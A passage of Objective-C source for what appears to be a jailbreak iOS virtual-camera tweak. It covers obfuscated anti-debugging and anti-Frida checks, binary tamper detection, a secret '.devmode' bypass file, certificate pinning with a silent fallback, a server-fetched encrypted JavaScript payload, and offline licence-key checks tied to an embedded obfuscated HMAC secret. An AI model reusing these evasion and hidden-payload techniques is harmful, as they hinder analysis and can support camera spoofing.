                    strstr(name, _dsc4("\x38\x2C\x37\x3A\x3F\x06\x3F\x39\x3B\x30\x2A",11,_b3)) ||
                    strstr(name, _dsc("\x5B\x5E\x55\x51\x45\x5E\x53\x56",8,_b4)) ||
                    strstr(name, _dsc("\x54\x4E\x54\x45\x5E\x47\x43",7,_b5)) ||
                    strstr(name, _dsc("\x5B\x5E\x55\x54\x4E\x54\x45\x5E\x47\x43",10,_b6)) ||
                    strstr(name, _dsc("\x44\x42\x55\x44\x43\x45\x56\x43\x52\x1A\x5E\x59\x44\x52\x45\x43\x52\x45",18,_b7)) ||
                    strstr(name, _dsc("\x64\x64\x7B\x7C\x5E\x5B\x5B\x64\x40\x5E\x43\x54\x5F",13,_b8)) ||
                    strstr(name, _dsc("\x7A\x58\x55\x5E\x5B\x52\x64\x42\x55\x44\x43\x45\x56\x43\x52\x18\x73\x4E\x59\x56\x5A\x5E\x54\x7B\x5E\x55\x45\x56\x45\x5E\x52\x44\x18\x4D\x4D\x4D",36,_b9)))
                { _s = 90; break; }
            }
            _i++; _s = 2;
        } break;
        case 10: @try {
            struct sockaddr_in addr;
            memset(&addr, 0, sizeof(addr));
            addr.sin_family = AF_INET;
            addr.sin_port = htons(27042);
            addr.sin_addr.s_addr = inet_addr("127.0.0.1");
            int sock = socket(AF_INET, SOCK_STREAM, 0);
            if (sock >= 0) {
                struct timeval tv = {0, 200000};
                setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
                int ret = connect(sock, (struct sockaddr *)&addr, sizeof(addr));
                close(sock);
                if (ret == 0) { _s = 90; break; }
            }
        } @catch (NSException *e) {}
            _s = 20; break;
        case 20: @try {
            thread_act_array_t threads;
            mach_msg_type_number_t count;
            if (task_threads(mach_task_self(), &threads, &count) == KERN_SUCCESS) {
                for (mach_msg_type_number_t j = 0; j < count; j++) {
                    char nm[64] = {0};
                    pthread_t pt = pthread_from_mach_thread_np(threads[j]);
                    if (pt) {
                        pthread_getname_np(pt, nm, sizeof(nm));
                        char _t1[16],_t2[16],_t3[16],_t4[16];
                        if (strstr(nm, _dsc4("\x38\x2C\x37\x3A\x3F",5,_t1)) ||
                            strstr(nm, _dsc("\x50\x42\x5A\x1A\x5D\x44\x1A\x5B\x58\x58\x47",11,_t2)) ||
                            strstr(nm, _dsc4("\x39\x33\x3F\x37\x30",5,_t3)) ||
                            strstr(nm, _dsc("\x5B\x5E\x59\x5D\x52\x54\x43\x58\x45",9,_t4))) {
                            vm_deallocate(mach_task_self(), (vm_address_t)threads, count * sizeof(thread_act_t));
                            _s = 90; break;
                        }
                    }
                }
                if (_s == 90) break;
                vm_deallocate(mach_task_self(), (vm_address_t)threads, count * sizeof(thread_act_t));
            }
        } @catch (NSException *e) {}
            _s = 80; break;
        case 35: if (_cnt > 500) { _r = YES; _s = 99; } else { _s = 80; } break; // dead
        case 50: _i = _cnt; _s = 35; break; // dead
        case 65: if (_r) { _s = 50; } else { _s = 35; } break; // dead
        case 80: _r = NO; _s = 99; break;
        case 90: _r = YES; _s = 99; break;
        case 99: return _r;
        default: return NO;
    }
}

// Developer-mode flag — when /var/jb/var/mobile/Library/vcamplus/.devmode exists,
// anti-debug/anti-Frida checks are silently bypassed. Used by the author when
// running Frida-based research alongside the virtual camera. Normal users have
// no reason to know about this file or create it.
__attribute__((always_inline)) static BOOL _isDevMode(void) {
    static int cached = -1;
    if (cached < 0) {
        NSString *p = [VCAM_DIR stringByAppendingPathComponent:@".devmode"];
        cached = [[NSFileManager defaultManager] fileExistsAtPath:p] ? 1 : 0;
    }
    return cached == 1;
}

static void _antiDbgCheck(void) {
    if (_isDevMode()) {
        vcam_log(@"A: devmode (anti-debug bypassed)");
        return;
    }
    if (_adSysctl() || _adParent()) {
        _setAuth(NO);
        vcam_log(@"A: dbg");
    }
    if (_chkFrida()) {
        _setAuth(NO);
        vcam_log(@"A: inj");
    }
}

// --- Hardening 4: Binary Integrity ---
static volatile uint8_t _hkF3[] = {0xC2, 0xC9, 0xDC, 0x95, 0x34};
static uint32_t _savedCRC = 0;

__attribute__((always_inline)) static BOOL _chkPatches(void) {
    // Detect if _isAuth or _chkLC have been patched to "MOV W0, #1; RET"
    volatile uint32_t mov_w0_1 = 0x52800020;
    volatile uint32_t ret_insn = 0xD65F03C0;
#if __has_feature(ptrauth_calls)
    void *fn1 = __builtin_ptrauth_strip((void *)_isAuth, 0);
    void *fn2 = __builtin_ptrauth_strip((void *)_chkLC, 0);
#else
    void *fn1 = (void *)_isAuth;
    void *fn2 = (void *)_chkLC;
#endif
    // Safe memory read via vm_read_overwrite (no crash on bad address)
    uint32_t buf[2] = {0};
    vm_size_t outSz = 0;
    if (vm_read_overwrite(mach_task_self(), (vm_address_t)fn1, 8, (vm_address_t)buf, &outSz) == KERN_SUCCESS && outSz == 8) {
        if (buf[0] == mov_w0_1 && buf[1] == ret_insn) return YES;
    }
    outSz = 0; buf[0] = 0; buf[1] = 0;
    if (vm_read_overwrite(mach_task_self(), (vm_address_t)fn2, 8, (vm_address_t)buf, &outSz) == KERN_SUCCESS && outSz == 8) {
        if (buf[0] == mov_w0_1 && buf[1] == ret_insn) return YES;
    }
    return NO;
}

__attribute__((optnone)) static BOOL _chkInteg(void) {
    for (uint32_t i = 0; i < _dyld_image_count(); i++) {
        const char *name = _dyld_get_image_name(i);
        char _bn1[16];
        if (name && strstr(name, _dsc4("\x28\x3D\x3F\x33\x2E\x32\x2B\x2D",8,_bn1))) {
            const struct mach_header_64 *hdr =
                (const struct mach_header_64 *)_dyld_get_image_header(i);
            unsigned long sz = 0;
            uint8_t *sect = getsectiondata(hdr, "__TEXT", "__text", &sz);
            if (sect && sz > 0) {
                uint32_t crc = (uint32_t)crc32(0L, sect, (uInt)sz);
                if (_savedCRC == 0) {
                    _savedCRC = crc;
                    return NO; // first run, save baseline
                }
                return (crc != _savedCRC);
            }
        }
    }
    return NO;
}

__attribute__((optnone)) static BOOL _chkSwizzle(void) {
    uintptr_t textStart = 0, textEnd = 0;
    for (uint32_t i = 0; i < _dyld_image_count(); i++) {
        const char *name = _dyld_get_image_name(i);
        char _bn2[16];
        if (name && strstr(name, _dsc4("\x28\x3D\x3F\x33\x2E\x32\x2B\x2D",8,_bn2))) {
            const struct mach_header_64 *hdr =
                (const struct mach_header_64 *)_dyld_get_image_header(i);
            unsigned long sz = 0;
            uint8_t *sect = getsectiondata(hdr, "__TEXT", "__text", &sz);
            if (sect && sz > 0) {
                textStart = (uintptr_t)sect;
                textEnd = textStart + sz;
            }
            break;
        }
    }
    if (textStart == 0) return NO;
    void *fns[] = {(void *)_isAuth, (void *)_chkLC, (void *)_setAuth};
    for (int i = 0; i < 3; i++) {
#if __has_feature(ptrauth_calls)
        uintptr_t addr = (uintptr_t)__builtin_ptrauth_strip(fns[i], 0);
#else
        uintptr_t addr = (uintptr_t)fns[i];
#endif
        if (addr < textStart || addr >= textEnd) return YES;
    }
    return NO;
}

static void _integrityCheck(void) {
    if (_isDevMode()) {
        vcam_log(@"A: devmode (integrity check bypassed)");
        return;
    }
    volatile int _s = 0;
    BOOL _tamper = NO;
    while (1) switch (_s) {
        case 0:
            if (_aS1 != 0) { _s = 3; } else { _s = 10; }
            break;
        case 3:
            if (!VCAM_CHK_A() || !VCAM_CHK_B()) { _s = 5; }
            else { _s = 7; }
            break;
        case 5:
            _aS1 = 0; _aS2 = 0; _aS3 = 0; _aS4 = 0;
            vcam_log(@"auth fragment mismatch");
            _s = 10;
            break;
        case 7:
            if (!VCAM_CHK_C()) { _s = 5; } else { _s = 10; }
            break;
        case 10:
            if (_chkPatches()) { _tamper = YES; _s = 20; }
            else { _s = 13; }
            break;
        case 13:
            if (_chkInteg()) { _tamper = YES; _s = 20; }
            else { _s = 16; }
            break;
        case 16:
            if (_chkSwizzle()) { _tamper = YES; _s = 20; }
            else { _s = 99; }
            break;
        case 20:
            if (_tamper) { _setAuth(NO); vcam_log(@"A: tamper"); }
            _s = 99;
            break;
        case 25: if (_aS3 == 0) { _s = 10; } else { _s = 30; } break; // dead
        case 30: _tamper = (_aS4 == 0); _s = 20; break; // dead
        case 40: if (_tamper) { _s = 25; } else { _s = 30; } break; // dead
        default: return;
    }
}

__attribute__((optnone)) static NSData *_hmacSecret(void) {
    static volatile uint8_t _hkF4[] = {0xD6, 0xB1, 0xCA, 0xC3, 0xF6, 0x76};
    uint8_t dec[19];
    volatile uint8_t k1 = 0x53, k2 = 0xE4, k3 = 0x64, k4 = 0xA3;
    for (int i = 0; i < 3; i++) dec[i] = _hkF1[i] ^ k1;
    for (int i = 0; i < 5; i++) dec[3 + i] = _hkF2[i] ^ k2;
    for (int i = 0; i < 5; i++) dec[8 + i] = _hkF3[i] ^ k3;
    for (int i = 0; i < 6; i++) dec[13 + i] = _hkF4[i] ^ k4;
    NSData *r = [NSData dataWithBytes:dec length:19];
    memset(dec, 0, 19);
    return r;
}

__attribute__((optnone)) static BOOL _vrfHMAC(NSDictionary *resp, NSString *sigHex) {
    NSMutableDictionary *body = [resp mutableCopy];
    [body removeObjectForKey:_ds2("\xA1\xDF\x43", 3)];

    NSData *jsonData = [NSJSONSerialization dataWithJSONObject:body
        options:NSJSONWritingSortedKeys error:nil];
    if (!jsonData) return NO;

    // HMAC-SHA256
    NSData *secret = _hmacSecret();
    uint8_t hmac[CC_SHA256_DIGEST_LENGTH];
    CCHmac(kCCHmacAlgSHA256, secret.bytes, secret.length,
        jsonData.bytes, jsonData.length, hmac);

    // Hex encode
    NSMutableString *computed = [NSMutableString stringWithCapacity:64];
    for (int i = 0; i < CC_SHA256_DIGEST_LENGTH; i++)
        [computed appendFormat:@"%02x", hmac[i]];

    // Constant-time comparison
    if (computed.length != sigHex.length) return NO;
    volatile uint8_t result = 0;
    const char *a = [computed UTF8String];
    const char *b = [sigHex UTF8String];
    for (NSUInteger i = 0; i < computed.length; i++)
        result |= a[i] ^ b[i];
    return result == 0;
}

// --- Hardening 6: SSL Certificate Pinning ---
@interface CPDlg : NSObject <NSURLSessionDelegate>
@end
@implementation CPDlg
- (void)URLSession:(NSURLSession *)session
    didReceiveChallenge:(NSURLAuthenticationChallenge *)challenge
    completionHandler:(void (^)(NSURLSessionAuthChallengeDisposition,
        NSURLCredential * _Nullable))completionHandler {
    if (![challenge.protectionSpace.authenticationMethod
            isEqualToString:NSURLAuthenticationMethodServerTrust]) {
        completionHandler(NSURLSessionAuthChallengePerformDefaultHandling, nil);
        return;
    }
    SecTrustRef trust = challenge.protectionSpace.serverTrust;
    if (!trust) {
        completionHandler(NSURLSessionAuthChallengeCancelAuthenticationChallenge, nil);
        return;
    }

    NSArray *pinnedHashes = @[
        _ds2("\x35\xFF\xC5\x59\x37\x03\xD8\x49\xA1\xC6\x95\x52\x42\x62\xB7\x71\x8F\xDA\xED\x2D\x43\x70\x61\x91\xE0\x27\x54\xF7\x61\xCF\x1B\xDD\x74\xBA\x0C\x21\x22\x1C\x04\xBB\x9B\x0B\xB5\x81\x2F\x7B\xFC\xEB\x99\x23\xA3\xC1\xFA\x45\x99\x27\xCA\xFA\xB5\xE6\x45\x47\x07\xD9", 64),
        _ds2("\x35\xC4\xDD\x69\xF7\x7D\x0D\xA1\xB4\xCC\x31\x66\x52\x8D\x41\x13\xB6\x58\xB8\xE7\x3D\x1B\x0F\xE1\xC0\x7D\x9D\xDF\x51\xEF\xD1\xE9\x6C\x9A\xCC\x75\x43\x04\xF9\xD1\x4F\xCC\xB5\x6E\x2F\x93\xE4\xC1\xA9\xBE\x45\x7E\x6A\xEA\xEF\x85\xE2\x78\xA5\xFF\xC1\x88\x1F\xEE", 64),
        _ds2("\x35\xA4\xBD\x69\xCD\x65\xD8\x49\x41\x86\x2F\xA9\xE2\x72\x16\x6D\xC2\xCA\x8D\x0D\xA7\x17\x91\xE6\x1B\x8B\x9D\xDF\x51\x0F\xCB\x36\x84\x8D\xAC\x81\x22\x2C\x54\x9B\xA5\xC4\xDD\x6E\xC5\x81\xFC\x49\xA9\xBE\x47\x6E\x62\x45\x2E\x9D\xA3\xCA\xF0\xE6\x5D\x47\xFF\xC9", 64),
    ];

    // Check all certificates in chain
    CFArrayRef chain = SecTrustCopyCertificateChain(trust);
    if (!chain) {
        completionHandler(NSURLSessionAuthChallengeCancelAuthenticationChallenge, nil);
        return;
    }

    BOOL matched = NO;
    CFIndex count = CFArrayGetCount(chain);
    for (CFIndex i = 0; i < count && !matched; i++) {
        SecCertificateRef cert = (SecCertificateRef)CFArrayGetValueAtIndex(chain, i);
        SecKeyRef pubkey = SecCertificateCopyKey(cert);
        if (!pubkey) continue;
        CFDataRef keyData = SecKeyCopyExternalRepresentation(pubkey, NULL);
        CFRelease(pubkey);
        if (!keyData) continue;

        uint8_t hash[CC_SHA256_DIGEST_LENGTH];
        CC_SHA256(CFDataGetBytePtr(keyData), (CC_LONG)CFDataGetLength(keyData), hash);
        CFRelease(keyData);

        NSMutableString *hexHash = [NSMutableString stringWithCapacity:64];
        for (int j = 0; j < CC_SHA256_DIGEST_LENGTH; j++)
            [hexHash appendFormat:@"%02x", hash[j]];

        for (NSString *pin in pinnedHashes) {
            if ([hexHash isEqualToString:pin]) { matched = YES; break; }
        }
        if (!matched && i == 0) {
            vcam_log([NSString stringWithFormat:@"SSL leaf: %@", hexHash]);
        }
    }
    CFRelease(chain);

    if (matched) {
        completionHandler(NSURLSessionAuthChallengeUseCredential,
            [NSURLCredential credentialForTrust:trust]);
    } else {
        vcam_log(@"SSL pin: fallback");
        completionHandler(NSURLSessionAuthChallengePerformDefaultHandling, nil);
    }
}
@end

static NSURLSession *_pinnedSession(void) {
    static NSURLSession *s = nil;
    static dispatch_once_t o;
    dispatch_once(&o, ^{
        static CPDlg *dlg = nil;
        dlg = [[CPDlg alloc] init];
        NSURLSessionConfiguration *cfg = [NSURLSessionConfiguration ephemeralSessionConfiguration];
        cfg.timeoutIntervalForRequest = 15;
        s = [NSURLSession sessionWithConfiguration:cfg delegate:dlg delegateQueue:nil];
    });
    return s;
}

// Fetch WebCam JS from server and cache locally (XOR encrypted)
static void _fetchWebJS(void) {
    NSString *key = _getCachedKey();
    if (!key) return;
    NSString *udid = _gDID();
    dispatch_async(dispatch_get_global_queue(0, 0), ^{
        @try {
            NSDictionary *body = @{_ds("\x5C\x52\x4E",3): key, _ds("\x42\x53\x5E\x53",4): udid};
            NSData *jd = [NSJSONSerialization dataWithJSONObject:body options:0 error:nil];
            NSMutableURLRequest *r = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:_webJSURL()]
                cachePolicy:NSURLRequestReloadIgnoringCacheData timeoutInterval:15];
            [r setHTTPMethod:_ds("\x67\x78\x64\x63",4)];
            [r setValue:_ds("\x56\x47\x47\x5B\x5E\x54\x56\x43\x5E\x58\x59\x18\x5D\x44\x58\x59",16) forHTTPHeaderField:_ds("\x74\x58\x59\x43\x52\x59\x43\x1A\x63\x4E\x47\x52",12)];
            [r setHTTPBody:jd];
            vcam_log([NSString stringWithFormat:@"webjs: requesting %@", _webJSURL()]);
            NSURLSessionDataTask *t = [_pinnedSession() dataTaskWithRequest:r
                completionHandler:^(NSData *data, NSURLResponse *resp, NSError *err) {
                    if (err || !data) {
                        vcam_log([NSString stringWithFormat:@"webjs: net err %@", err.localizedDescription ?: @"no data"]);
                        return;
                    }
                    NSString *rawStr = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
                    NSInteger code = 0;
                    if ([resp isKindOfClass:[NSHTTPURLResponse class]]) code = [(NSHTTPURLResponse *)resp statusCode];
                    NSDictionary *res = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil];
                    if (!res || ![res[@"ok"] boolValue]) {
                        vcam_log([NSString stringWithFormat:@"webjs: denied (HTTP %ld) %@", (long)code, rawStr.length > 200 ? [rawStr substringToIndex:200] : rawStr]);
                        return;
                    }
                    NSString *encB64 = res[@"d"];
                    if (!encB64) {
                        vcam_log(@"webjs: no payload");
                        return;
                    }
                    // AES-256-CBC decrypt: key = SHA256(HMAC_SECRET + udid)
                    NSData *encData = [[NSData alloc] initWithBase64EncodedString:encB64 options:0];
                    if (!encData || encData.length < 17) {
                        vcam_log(@"webjs: bad enc data");
                        return;
                    }
                    // Derive AES key from obfuscated HMAC secret + UDID
                    NSData *hmacSec = _hmacSecret();
                    NSMutableData *keyMat = [NSMutableData dataWithData:hmacSec];
                    [keyMat appendData:[udid dataUsingEncoding:NSUTF8StringEncoding]];
                    uint8_t aesKey[CC_SHA256_DIGEST_LENGTH];
                    CC_SHA256(keyMat.bytes, (CC_LONG)keyMat.length, aesKey);
                    // Extract IV (first 16 bytes) and ciphertext
                    const uint8_t *encBytes = (const uint8_t *)encData.bytes;
                    NSUInteger cipherLen = encData.length - 16;
                    size_t outLen = 0;
                    uint8_t *outBuf = (uint8_t *)malloc(cipherLen + kCCBlockSizeAES128);
                    CCCryptorStatus cs = CCCrypt(kCCDecrypt, kCCAlgorithmAES128, kCCOptionPKCS7Padding,
                        aesKey, kCCKeySizeAES256, encBytes,
                        encBytes + 16, cipherLen, outBuf, cipherLen + kCCBlockSizeAES128, &outLen);
                    if (cs != kCCSuccess) {
                        free(outBuf);
                        vcam_log([NSString stringWithFormat:@"webjs: decrypt fail %d", (int)cs]);
                        return;
                    }
                    NSData *jsonData = [NSData dataWithBytesNoCopy:outBuf length:outLen freeWhenDone:YES];
                    NSDictionary *jsDict = [NSJSONSerialization JSONObjectWithData:jsonData options:0 error:nil];
                    if (!jsDict || !jsDict[@"s"] || !jsDict[@"v"] || !jsDict[@"i"]) {
                        vcam_log(@"webjs: bad decrypted json");
                        return;
                    }
                    // Compute device hash for UDID binding verification
                    uint8_t udidHash[CC_SHA256_DIGEST_LENGTH];
                    NSData *udidData = [udid dataUsingEncoding:NSUTF8StringEncoding];
                    CC_SHA256(udidData.bytes, (CC_LONG)udidData.length, udidHash);
                    NSMutableString *hashHex = [NSMutableString string];
                    for (int hi = 0; hi < 8; hi++) [hashHex appendFormat:@"%02x", udidHash[hi]];
                    // Store with device hash for local UDID binding
                    NSDictionary *storeDict = @{@"s": jsDict[@"s"], @"v": jsDict[@"v"], @"i": jsDict[@"i"], @"u": hashHex};
                    NSData *storeData = [NSJSONSerialization dataWithJSONObject:storeDict options:0 error:nil];
                    if (!storeData) return;
                    NSMutableData *md = [NSMutableData dataWithData:storeData];
                    _xorBuf((uint8_t *)[md mutableBytes], md.length);
                    NSString *b64 = [md base64EncodedStringWithOptions:0];
                    [[NSFileManager defaultManager] createDirectoryAtPath:VCAM_DIR withIntermediateDirectories:YES attributes:nil error:nil];
                    [b64 writeToFile:_webJSPath() atomically:YES encoding:NSUTF8StringEncoding error:nil];
                    vcam_log(@"webjs: cached ok");
                }];
            [t resume];
        } @catch (NSException *e) {
            vcam_log(@"webjs: exception");
        }
    });
}

// Online verify (async)
// [CARDKEY] 离线卡密验证: 解析 VCAM-XXXX-XXXX-XXXX-XXXX，校验 HMAC-SHA256[:7]
//   字节 0: low 3 bits = plan_id (0=hour 1=day 2=week 3=month 4=year)
//   字节 1-2: 16-bit nonce
//   字节 3-9: HMAC-SHA256(SECRET, byte0||nonce)[:7]
static void _vrfO(NSString *key, void (^done)(BOOL ok, NSString *msg, double exp)) {
    dispatch_async(dispatch_get_global_queue(0, 0), ^{
        @try {
            NSString *udid = _gDID();
            NSString *clean = [[[key uppercaseString] componentsSeparatedByString:@"-"] componentsJoinedByString:@""];
            if (![clean hasPrefix:@"VCAM"] || clean.length != 20) {
                dispatch_async(dispatch_get_main_queue(), ^{ done(NO, @"授权码格式错误", 0); });
                return;
            }
            NSString *body = [clean substringFromIndex:4]; // 16 chars

            // RFC4648 base32 解码 → 10 bytes
            static const char *ALPHA = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
            uint8_t bits[80];
            for (int i = 0; i < 16; i++) {
                unichar c = [body characterAtIndex:i];
                const char *p = strchr(ALPHA, (int)c);
                if (!p) {
                    dispatch_async(dispatch_get_main_queue(), ^{ done(NO, @"授权码包含无效字符", 0); });
                    return;
                }
                int idx = (int)(p - ALPHA);
                for (int b = 0; b < 5; b++) bits[i*5 + b] = (idx >> (4-b)) & 1;
            }
            uint8_t raw[10];
            for (int i = 0; i < 10; i++) {
                uint8_t v = 0;
                for (int b = 0; b < 8; b++) v = (uint8_t)((v << 1) | bits[i*8 + b]);
                raw[i] = v;
            }

            uint8_t b0 = raw[0];
            if (b0 & 0xF8) {
                dispatch_async(dispatch_get_main_queue(), ^{ done(NO, @"授权码无效", 0); });
                return;
            }
            int plan_id = b0 & 0x07;
            if (plan_id < 0 || plan_id > 4) {
                dispatch_async(dispatch_get_main_queue(), ^{ done(NO, @"未知卡密类型", 0); });
                return;
            }

            // HMAC 校验 (SECRET 来自 _hmacSecret(), 与 keygen.py 完全一致)
            NSData *secret = _hmacSecret();
            uint8_t expect[CC_SHA256_DIGEST_LENGTH];
            uint8_t mmsg[3] = { raw[0], raw[1], raw[2] };
            CCHmac(kCCHmacAlgSHA256, secret.bytes, secret.length, mmsg, 3, expect);
            volatile uint8_t diff = 0;
            for (int i = 0; i < 7; i++) diff |= (uint8_t)(expect[i] ^ raw[3+i]);
            if (diff != 0) {
                dispatch_async(dispatch_get_main_queue(), ^{ done(NO, @"无效授权码", 0); });
                return;
            }

            // 计算到期时间
            static const double DUR[5] = {
                1.0 * 3600.0 * 1000.0,           // hour
                24.0 * 3600.0 * 1000.0,          // day
                7.0 * 24.0 * 3600.0 * 1000.0,    // week
                30.0 * 24.0 * 3600.0 * 1000.0,   // month
                365.0 * 24.0 * 3600.0 * 1000.0,  // year
            };
            double now = [[NSDate date] timeIntervalSince1970] * 1000.0;
            double expires = now + DUR[plan_id];

            // 写入加密缓存 (UDID 绑定: _chkLC 读缓存时校验 _gDID() 必须一致)
            _svLC(key, udid, expires, 999999);
            _savTS();

            dispatch_async(dispatch_get_main_queue(), ^{ done(YES, @"授权成功", expires); });
        } @catch (NSException *ex) {
            dispatch_async(dispatch_get_main_queue(), ^{ done(NO, @"验证异常", 0); });
        }
    });
}

// Activation UI
static void _shAct(void) {
    dispatch_async(dispatch_get_main_queue(), ^{
        UIViewController *top = vcam_topVC();
        if (!top) return;

        UIAlertController *a = [UIAlertController alertControllerWithTitle:@"Virtual Camera 授权"
            message:@"请输入授权码激活插件\n类型: 时卡/天卡/周卡/月卡/年卡\n一码一机，激活后绑定当前设备\n离线验证，无需联网"
            preferredStyle:UIAlertControllerStyleAlert];

        [a addTextFieldWithConfigurationHandler:^(UITextField *tf) {
            tf.placeholder = _ds("\x61\x74\x76\x7A\x1A\x6F\x6F\x6F\x6F\x1A\x6F\x6F\x6F\x6F\x1A\x6F\x6F\x6F\x6F",19);
            tf.autocapitalizationType = UITextAutocapitalizationTypeAllCharacters;
            tf.autocorrectionType = UITextAutocorrectionTypeNo;
        }];

        [a addAction:[UIAlertAction actionWithTitle:@"激活" style:UIAlertActionStyleDefault handler:^(UIAlertAction *x) {
            NSString *key = [a.textFields.firstObject.text stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]];
            if (!key || key.length == 0) return;

            UIAlertController *ld = [UIAlertController alertControllerWithTitle:nil
                message:@"正在验证..." preferredStyle:UIAlertControllerStyleAlert];
            [top presentViewController:ld animated:YES completion:nil];

            _vrfO(key, ^(BOOL ok, NSString *msg, double exp) {
                [ld dismissViewControllerAnimated:YES completion:^{
                    if (ok) {
                        _setAuth(YES);
                        // Notify all processes to restore auth
                        CFNotificationCenterPostNotification(
                            CFNotificationCenterGetDarwinNotifyCenter(),
                            (__bridge CFStringRef)_ds("\x54\x58\x5A\x19\x41\x54\x56\x5A\x47\x5B\x42\x44\x19\x56\x42\x43\x5F\x58\x59",19), NULL, NULL, YES);
                        double days = (exp - [[NSDate date] timeIntervalSince1970] * 1000.0) / 86400000.0;
                        NSString *sm = [NSString stringWithFormat:@"%@\n剩余: %.1f 天", msg, days];
                        UIAlertController *s = [UIAlertController alertControllerWithTitle:@"授权成功"
                            message:sm preferredStyle:UIAlertControllerStyleAlert];
                        [s addAction:[UIAlertAction actionWithTitle:@"确定" style:UIAlertActionStyleDefault handler:nil]];
                        [vcam_topVC() presentViewController:s animated:YES completion:nil];
                    } else {
                        UIAlertController *f = [UIAlertController alertControllerWithTitle:@"授权失败"
                            message:msg preferredStyle:UIAlertControllerStyleAlert];
                        [f addAction:[UIAlertAction actionWithTitle:@"重试" style:UIAlertActionStyleDefault handler:^(UIAlertAction *x2) {
                            _shAct();
                        }]];
                        [f addAction:[UIAlertAction actionWithTitle:@"取消" style:UIAlertActionStyleCancel handler:nil]];
                        [vcam_topVC() presentViewController:f animated:YES completion:nil];
                    }
                }];
            });
        }]];

        [a addAction:[UIAlertAction actionWithTitle:@"取消" style:UIAlertActionStyleCancel handler:nil]];
        [top presentViewController:a animated:YES completion:nil];
    });
}

// Startup check
static void _onlineChk(void);
static void _autoRestore(void);
static void _chkA(void) {
    // [CARDKEY] 启动检查 (离线): 校验本地缓存 -> setAuth
    volatile int _s = 0;
    while (1) switch (_s) {
        case 0: _s = _chkLC() ? 3 : 10; break;
        case 3: _setAuth(YES); _s = 5; break;
        case 5: vcam_log(@"A: ok"); _s = 99; break;
        case 10: _setAuth(NO); _s = 12; break;
        case 12: vcam_log(@"A: need"); _s = 99; break;
        case 15: if (_aS1 > 0) { _s = 3; } else { _s = 10; } break; // dead
        case 18: _s = (_aS3 != 0) ? 15 : 10; break; // dead
        case 99: return;
        default: return;
    }
}

// Periodic re-validation (self-scheduling every 60 seconds)
static void _reVal(void) {
    // [CARDKEY] 周期复检 (离线): 每 60 秒重读本地缓存
    volatile int _s = 0;
    while (1) switch (_s) {
        case 0: _savTS(); _s = 3; break;
        case 3: _s = _chkLC() ? 5 : 7; break;
        case 5: _setAuth(YES); _s = 10; break;
        case 7: _setAuth(NO); _s = 10; break;
        case 10: _s = 13; break; // [CARDKEY] skip _onlineChk (offline)
        case 13: dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(60.0 * NSEC_PER_SEC)),
                    dispatch_get_global_queue(0, 0), ^{ _reVal(); });
                 _s = 99; break;
        case 99: return;
        default: return;
    }
}

// Refresh local license cache expiry (extend 1h window on heartbeat success)
static void _refreshLC(void) {
    @try {
        NSData *data = [NSData dataWithContentsOfFile:_licPath()];
        if (!data || data.length < 10) return;
        NSString *b64 = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
        if (!b64) return;
        NSData *dec = [[NSData alloc] initWithBase64EncodedString:b64 options:0];
        if (!dec) return;
        NSMutableData *md = [NSMutableData dataWithData:dec];
        _xorBuf((uint8_t *)[md mutableBytes], md.length);
        NSDictionary *d = [NSJSONSerialization JSONObjectWithData:md options:0 error:nil];
        if (!d) return;
        NSString *k = d[@"k"], *u = d[@"u"];
        NSNumber *reN = d[@"re"], *ulN = d[@"ul"];
        if (!k || !u || !reN) return;
        double realExp = [reN doubleValue];
        int ul = ulN ? [ulN intValue] : 0;
        _svLC(k, u, realExp, ul);
    } @catch (NSException *e) {}
}

// Auto-restore: try to recover license from server using UDID (after re-jailbreak/restore)
__attribute__((unused)) static void _autoRestore(void) {
    // Only attempt if no local cache exists
    if (_getCachedKey()) return;
    NSString *udid = _gDID();
    if (!udid || udid.length == 0) return;
    vcam_log(@"restore: attempting auto-restore...");
    dispatch_async(dispatch_get_global_queue(0, 0), ^{
        @try {
            NSDictionary *body = @{_ds("\x42\x53\x5E\x53",4): udid, _ds("\x41\x52\x45",3): @(VCAM_BUILD)};
            NSData *jd = [NSJSONSerialization dataWithJSONObject:body options:0 error:nil];
            NSMutableURLRequest *r = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:_restoreURL()]
                cachePolicy:NSURLRequestReloadIgnoringCacheData timeoutInterval:15];
            [r setHTTPMethod:_ds("\x67\x78\x64\x63",4)];
            [r setValue:_ds("\x56\x47\x47\x5B\x5E\x54\x56\x43\x5E\x58\x59\x18\x5D\x44\x58\x59",16) forHTTPHeaderField:_ds("\x74\x58\x59\x43\x52\x59\x43\x1A\x63\x4E\x47\x52",12)];
            [r setHTTPBody:jd];
            NSURLSessionDataTask *t = [_pinnedSession() dataTaskWithRequest:r
                completionHandler:^(NSData *data, NSURLResponse *resp, NSError *err) {
                    if (err || !data) { vcam_log(@"restore: network error"); return; }
                    NSDictionary *res = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil];
                    if (!res) { vcam_log(@"restore: bad response"); return; }
                    NSString *sig = res[_ds2("\xA1\xDF\x43", 3)];
                    NSNumber *tsN = res[_ds2("\xAF", 1)];
                    if (!sig || !tsN) { vcam_log(@"restore: sig missing"); return; }
                    double nowMs = [[NSDate date] timeIntervalSince1970] * 1000.0;
                    if (fabs(nowMs - [tsN doubleValue]) > 5 * 60 * 1000) { vcam_log(@"restore: ts drift"); return; }
                    if (!_vrfHMAC(res, sig)) { vcam_log(@"restore: hmac fail"); return; }
                    if ([res[_ds("\x58\x5C",2)] boolValue]) {
                        NSString *key = res[_ds("\x5C\x52\x4E",3)];
                        double exp = [res[_ds("\x52\x4F\x47\x5E\x45\x52\x44",7)] doubleValue];
                        int ul = [res[_ds("\x42\x44\x52\x44\x7B\x52\x51\x43",8)] intValue];
                        if (key) {
                            _svLC(key, udid, exp, ul);
                            _setAuth(YES);
                            _fetchWebJS();
                            vcam_log(@"restore: success! license recovered");
                        }
                    } else {
                        vcam_log(@"restore: no license for this UDID");
                    }
                }];
            [t resume];
        } @catch (NSException *e) {
            vcam_log(@"restore: exception");
        }
    });
}

// Online heartbeat check (silent, async)
__attribute__((optnone)) __attribute__((unused)) static void _onlineChk(void) {
    NSString *key = _getCachedKey();
    if (!key) return;
    NSString *udid = _gDID();
